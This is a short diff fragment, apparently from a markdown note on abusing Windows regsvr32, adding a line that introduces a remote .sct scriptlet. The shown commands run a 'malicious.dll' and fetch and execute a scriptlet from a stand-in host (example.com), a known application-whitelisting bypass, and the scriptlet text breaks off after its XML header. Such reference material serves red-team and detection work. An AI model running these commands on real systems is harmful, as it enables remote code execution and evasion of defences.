@@ -18,6 +18,7 @@ c:\Windows\System32\regsvr32.exe c:\Users\pwn\Downloads\malicious.dll
 c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\malicious.dll
 ```
 
+With the .sct file as: 
 ```bash
 #http://example.com/file.sct
 <?XML version="1.0"?>
